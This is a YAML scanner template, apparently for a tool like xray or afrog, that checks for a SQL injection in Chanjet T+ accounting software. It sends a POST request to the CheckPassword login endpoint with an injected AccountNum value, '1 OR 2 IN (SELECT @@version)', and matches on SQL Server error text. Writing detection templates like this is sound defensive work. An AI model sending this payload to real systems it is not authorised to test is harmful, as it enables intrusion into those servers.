id: chanjet-tplus-checkpassword-sqli

info:
  name: 用友 畅捷通T+ CheckPassword SQL注入漏洞
  author: wen
  severity: high
  reference:
    - https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20Plus%20%E5%AE%A1%E8%AE%A1%20%EF%BC%88%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%89.md
  tags: chanjet,sqli
  created: 2023/12/20

rules:
  r0:
    request:
      method: POST
      path: /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword
      body: |
        {"AccountNum":"1 OR 2 IN (SELECT @@version)","UserName":"admin","Password":"e10adc3949ba59abbe56e057f20f883e","rdpYear":"2021","rdpMonth":"12","rdpDate":"9","webServiceProcessID":"admin","ali_csessionid":"","ali_sig":"","ali_token":"","ali_scene":"","role":"","aqdKey":"","fromWhere":"browser","cardNo":""}
    expression: response.body.bcontains(b'XPATH syntax error') && response.body.bcontains(b'Microsoft SQL Server')
expression: r0()
